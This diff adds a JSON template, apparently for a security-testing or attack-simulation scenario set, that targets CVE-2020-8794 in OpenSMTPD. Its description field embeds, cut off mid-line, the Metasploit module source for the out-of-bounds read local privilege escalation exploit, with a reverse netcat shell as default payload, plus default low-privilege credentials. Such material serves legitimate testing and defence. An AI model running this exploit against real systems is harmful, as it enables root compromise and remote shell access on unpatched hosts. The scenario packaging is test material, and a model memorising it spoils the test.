@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_48185",
+  "category": "C2_systemd",
+  "attack_technique": "T1543.002",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit) (CVE-2020-8794)\n\nExploit source code (48185.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  # smtpd(8) may crash on a malformed message\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Expect\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenSMTPD OOB Read Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits an out-of-bounds read of an attacker-controlled\n        string in OpenSMTPD's MTA implementation to execute a command as the\n        root or nobody user, depending on the kind of grammar OpenSMTPD uses.\n      },\n      'Author'         => [\n        'Qualys', # Discovery and PoC\n        'wvu'     # Module\n      ],\n      'References'     => [\n        ['CVE', '2020-8794'],\n        ['URL', 'https://seclists.org/oss-sec/2020/q1/96']\n      ],\n      'DisclosureDate' => '2020-02-24',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true, # NOTE: Only when exploiting new grammar\n      # Patched in 6.6.4: https://www.opensmtpd.org/security.html\n      # New grammar introduced in 6.4.0: https://github.com/openbsd/src/commit/e396a728fd79383b972631720cddc8e987806546\n      'Targets'        => [\n        ['OpenSMTPD < 6.6.4 (automatic grammar selection)',\n          patched_version:     Gem::Version.new('6.6.4'),\n          new_grammar_version: Gem::Version.new('6.4.0')\n        ]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {\n        'SRVPORT'      => 25,\n        'PAYLOAD'      => 'cmd/unix/reverse_netcat',\n        'WfsDelay'     => 60 # May take a little while for mail to process\n      },\n      'Notes'          => {\n        'Stability'    => [CRASH_SERVICE_DOWN],\n        'Reliability'  => [REPEATABLE_SESSION],\n        'SideEffects'  => [IOC_IN_LOGS]\n      }\n    ))\n\n    register_advanced_options([\n      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])\n    ])\n\n    # HACK: We need to run check in order to determine a grammar to use\n    options.remove_option('AutoCheck')\n  end\n\n  def srvhost_addr\n    Rex::Socket.source_address(session.session_host)\n  end\n\n  def rcpt_to\n    \"#{rand_text_alpha_lower(8..42)}@[#{srvhost_addr}]\"\n  end\n\n  def check\n    smtpd_help = cmd_exec('smtpd -h')\n\n    if smtpd_help.empty?\n      return CheckCode::Unknown('smtpd(8) help could not be displayed')\n    end\n\n    version = smtpd_help.scan(/^version: OpenSMTPD ([\\d.p]+)$/).flatten.first\n\n    unless version\n      return CheckCode::Unknown('OpenSMTPD version could not be found')\n    end\n\n    version = Gem::Version.new(version)\n\n    if version < target[:patched_version]\n      if version >= target[:new_grammar_version]\n        vprint_status(\"OpenSMTPD #{version} is using new grammar\")\n        @grammar = :new\n      else\n        v\n```",
+  "cve": "CVE-2020-8794",
+  "exploitdb_id": "48185",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_48185",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
